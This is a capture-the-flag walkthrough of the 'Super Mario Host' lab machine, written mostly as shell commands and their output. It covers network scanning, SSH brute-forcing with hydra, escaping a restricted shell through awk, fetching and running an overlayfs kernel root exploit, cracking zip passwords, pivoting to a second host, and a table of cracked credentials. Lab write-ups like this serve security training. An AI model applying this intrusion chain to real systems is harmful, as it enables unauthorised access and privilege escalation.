@@ -1,0 +1,197 @@
+Recon Phase:
+
+$ netdiscover -r 192.168.190.0/24 -i vmnet1
+    192.168.190.132
+$ nmap -p 1-65535 -T4 -A -v 192.168.190.132
+    PORT     STATE SERVICE VERSION
+    22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   1024 1c:97:c0:06:3b:cb:4f:6f:0f:65:8d:37:82:c4:23:59 (DSA)
+    |   2048 45:2d:fe:04:bb:98:ed:00:d7:7b:36:da:8f:cf:44:1c (RSA)
+    |_  256 09:5c:25:9d:5c:54:ae:8d:90:e3:44:9b:5e:a1:4d:e0 (ECDSA)
+    8180/tcp open  http    Apache httpd
+    | http-methods:
+    |_  Supported Methods: POST OPTIONS GET HEAD
+    |_http-server-header: Apache
+    |_http-title: nginx
+
+$ dirb http://192.168.190.132:8180 /usr/share/wordlists/dirb/big.txt
+
+    + http://192.168.190.132:8180/server-status (CODE:403|SIZE:215)
+    + http://192.168.190.132:8180/vhosts (CODE:200|SIZE:1364)
+vhosts gave me
+    <VirtualHost *:80>
+    	# The ServerName directive sets the request scheme, hostname and port that
+    	# the server uses to identify itself. This is used when creating
+    	# redirection URLs. In the context of virtual hosts, the ServerName
+    	# specifies what hostname must appear in the request's Host: header to
+    	# match this virtual host. For the default virtual host (this file) this
+    	# value is not decisive as it is used as a last resort host regardless.
+    	# However, you must set it for any further virtual host explicitly.
+
+    	ServerName mario.supermariohost.local
+    	ServerAdmin webmaster@localhost
+    	DocumentRoot /var/www/supermariohost
+    	DirectoryIndex mario.php
+
+    	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
+    	# error, crit, alert, emerg.
+    	# It is also possible to configure the loglevel for particular
+    	# modules, e.g.
+    	#LogLevel info ssl:warn
+
+    	ErrorLog ${APACHE_LOG_DIR}/supermariohost_error.log
+    	CustomLog ${APACHE_LOG_DIR}/supermariohost_access.log combined
+
+    	# For most configuration files from conf-available/, which are
+    	# enabled or disabled at a global level, it is possible to
+    	# include a line for only one particular virtual host. For example the
+    	# following line enables the CGI configuration for this host only
+    	# after it has been globally disabled with "a2disconf".
+    	#Include conf-available/serve-cgi-bin.conf
+    </VirtualHost>
+There is a virtual host on the host so i added mario.supermariohost.local to /etc/hosts
+then i tried mario.supermariohost.local:8180 and it gave me this
+
+    It'sa meeeee, Maaaaario! Welcome to Super Mario Host! Me and my tall brother
+    had the idea of making a tribute for this machine, we still trying to figure
+    out what to do to keep you entertained! In the meantime you can play with
+    this nice game I've added for you :D Credits to Mark Robbins, the source
+    code of the game can be found here.
+    Controls
+
+$ dirb http://mario.supermariohost.local:8180 /usr/share/wordlists/dirb/big.txt -X .php
+
+    + http://mario.supermariohost.local:8180/command.php (CODE:200|SIZE:231)
+    + http://mario.supermariohost.local:8180/mario.php (CODE:200|SIZE:7080)
+command.php is a page to confirm a user exits or not so i tried all Mario's character
+{mario, luigi, peach, yoshi, toad}
+http://mario.supermariohost.local:8180/command.php?username=""
+and the all exists!! -- Later you ll see it's just a false code
+================================================================================
+Attacking Phase:
+
+Then i made a list of these name and tried it with hydra no luck then tried to mixed it up
+$ john --wordlist:user --rules --stdout > pass
+$ hydra -L user -P pass -t 3 192.168.190.132 ssh
+    [ssh] host: 192.168.190.132   login: luigi   password: luigi1
+
+$ ssh luigi@192.168.190.132
+    password:luigi1
+$ ?
+    awk  cat  cd  clear  echo  exit  help  history  ll  lpath  ls  lsudo  vim
+spawn bash using awk http://stackoverflow.com/questions/14634349/calling-an-executable-program-using-awk
+$ awk 'BEGIN{system("/bin/bash")}'
+================================================================================
+Privilege Escalation:
+
+$ uname -a
+    Linux supermariohost 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08
+    UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+Then i downloaded overlayfs exploit https://www.exploit-db.com/exploits/37292/ on my
+local machine then i copied it to supermariohost's and compile it
+$ wget http://192.168.190.1/ofs.c
+$ gcc ofs.c -o ofs
+$ ./ofs
+    spawning threads
+    mount #1
+    mount #2
+    child threads done
+    /etc/ld.so.preload created
+    creating shared library
+$ id
+    uid=0(root) gid=0(root) groups=0(root),112(lshell),1001(luigi)
+$ cd /root
+$ ls
+    Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos  flag.zip
+Then i copied flag.zip on my local machine , and crack it using fcrackzip
+$ fcrackzip flag.zip -D -p /usr/share/wordlists/rockyou.txt -u
+    PASSWORD FOUND!!!!: pw == ilovepeach
+$ unzip flag.zip
+    [flag.zip] flag.txt password:
+    inflating: flag.txt
+$ cat flag.txt
+    Well done :D If you reached this it means you got root, congratulations.
+    Now, there are multiple ways to hack this machine. The goal is to get all
+    the passwords of all the users in this machine. If you did it, then congratulations,
+    I hope you had fun :D
+
+    Keep in touch on twitter through @mr_h4sh
+
+    Congratulations again!
+
+    mr_h4sh                   --> Flag 1
+================================================================================
+$ iptables -L
+    Chain FORWARD (policy ACCEPT)
+    target     prot opt source               destination
+    ACCEPT     all  --  anywhere             192.168.122.0/24     ctstate RELATED,ESTABLISHED
+    ACCEPT     all  --  192.168.122.0/24     anywhere
+There is a forwarding to 192.168.122.0 network
+$ arp -n
+    Address                  HWtype  HWaddress           Flags Mask            Iface
+    192.168.190.254          ether   00:50:56:e0:98:b9   C                     eth0
+    192.168.122.122          ether   52:54:00:24:ed:ab   C                     virbr0
+    192.168.190.1            ether   00:50:56:c0:00:01   C                     eth0
+There is another machine 192.168.122.122
+in file /.bak/users/luigi/
+$ cat message
+    Hi Luigi,
+
+    Since you've been messing around with my host, at this point I want to return the favour.
+    This is a "war", you "naughty" boy!
+
+    Mario.
+$ cat id_rsa.pub
+    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5+HFigZJi64vGOo8lCq6GuHU2iXp5bKi1wj
+    5ZEhqawHYrtEYNfOvRnNCA7WKG/XE3j4yziCvHRSLgES9YZPRiPBLhNoVhPoxmvhUi/2nHCm54r
+    dp8iWWdN4i/r3q2IV2YQk+XTVHNlPPSyCcSxGft22w57cR0NYXe3WmXm+q2TCASZs4jfM8kzwwR
+    FHSLLNqFHzT0nhwgfFXkcPq3i6rmlAsKwLBjBQHENQr/YPMdgb7A+Pek82pMT2yGPYPtO9JNLJy
+    mNYY/pBv5j+P4SVmQ7tCMwcJNYhgo4O/ziGQnBHEdpQ49lETMRrntMa6kZtc4mObz0EYAVhj7Ym
+    oyLp7 warluigi@warluigi
+$ ssh -i id_rsa warluigi@192.168.122.122
+    Enter passphrase for key 'id_rsa': warluigi
+$ uname -a
+    Linux warluigi 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08
+    UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+The from supermariohost's machine
+$ cd /.bak/users/luigi
+$ scp -i id_rsa /tmp/ofs warluigi@192.168.122.122:/tmp/
+Then from warluigi's machine
+$ cd /tmp
+./ofs
+    spawning threads
+    mount #1
+    mount #2
+    child threads done
+    /etc/ld.so.preload created
+    creating shared library
+$ id
+    uid=0(root) gid=0(root) groups=0(root),1000(warluigi)
+$ cd /root/
+$ cat .hint.txt
+    So, today I saw her again, Peach. I'm so in love for her but my brother is completely lost for her.
+    I know that he loves Peach, but Peach Loves Me.
+$ unzip flag2.zip
+    [flag2.zip] flag2.txt password: {peachlovesme}
+
+i tried peachlovesme and it worked!
+$ cat flag2.txt
+    Congratulations on your second flag!
+
+    As already mentioned in supermariohost, there are multiple ways to hack this machine.
+    The goal is to get all the passwords of all the users in this machine. If you did it,
+    then congratulations, I hope you had fun :D
+
+    Keep in touch on twitter through @mr_h4sh
+
+    Congratulations again!
+
+    mr_h4sh                  --> Flag 2
+================================================================================
+Usernames: |  Passwords:  |
+-----------|--------------|
+luigi      |  luigi1      |
+mario      |  ilovepeach! |
+warluigi   |  ilovepeach  |
+================================================================================
